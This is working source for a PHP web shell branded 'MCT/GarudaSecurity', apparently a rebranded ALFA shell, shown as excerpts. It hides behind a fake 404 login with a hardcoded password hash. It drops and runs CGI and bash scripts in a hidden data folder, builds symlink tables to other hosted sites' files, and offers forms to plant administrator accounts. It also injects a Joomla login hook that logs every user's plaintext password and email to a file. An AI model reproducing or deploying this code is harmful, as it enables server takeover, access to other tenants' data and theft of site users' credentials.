<?php
/*
	Author: 	MCT/GarudaSecurity
	Telegram: 	https://telegram.me/MCT
	YouTube: 	https://youtube.com/MCT
	Gmail:		sukabintang84@gmail.com
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'root',
    'password' => '0a3d001f4cbfc00e5bc03ddad798a95a',//md5(GarudaSecurity)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
define("__MCT_DATA_FOLDER__", "MCT_DATA");
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["MCTcgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["MCTcgiapi"])){
			if(!@file_exists("MCTcgiapi/".$_COOKIE["MCTcgiapi"].".MCT")){
				$recreate = true;
				$lang = $_COOKIE["MCTcgiapi"];
			}
		}
		if(!isset($_COOKIE["MCTcgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".MCT",$source);
			}
			alfacgihtaccess('cgi', "MCTcgiapi/");
		}else{
			$lang = $_COOKIE["MCTcgiapi"];
		}
		$cgi_ext = ".MCT";
		...
		$cgi_url = __MCT_DATA_FOLDER__."/MCTcgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("MCTcgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("MCTcgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="garsec team 2012" draggable="false" src="https://res.cloudinary.com/djbcxwh3n/image/upload/v1764285824/MTC_1_ngxzer.png" /></td>
</tr>
<tr>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["MCTcgiapi_mode"])&&!isset($_COOKIE["MCTcgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	$temp = "";
	$not_api = array("basedir.MCT", "getdir.MCT", "getheader.MCT");
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __MCT_DATA_FOLDER__);
	}
	@mkdir('MCTcgiapi',0755);
	__write_file("MCTcgiapi/".$name, __get_resource($source));
	@chmod("MCTcgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = alfaWriteTocgiapi("getheader.MCT",$bash);
		$data = alfaEx("cd '{$tmp_path}/MCTcgiapi';sh getheader.MCT",false,true,true);
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/MCTcgiapi/getdir.MCT")){
			...
			$tmp_getdir_path = alfaWriteTocgiapi("getdir.MCT",$bash);
			__alfa_set_cookie("alfachdir_bash", "true");
			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/MCTcgiapi;sh getdir.MCT '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'MCT', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'MCT', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'MCT', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __MCT_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__MCT_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__MCT_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__MCT_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__MCT_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$tmp_path = alfaWriteTocgiapi("basedir.MCT",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/MCTcgiapi;sh basedir.MCT ".$makepwd,false,true,true);
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$MCT_DATA = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($MCT_DATA, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__MCT_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
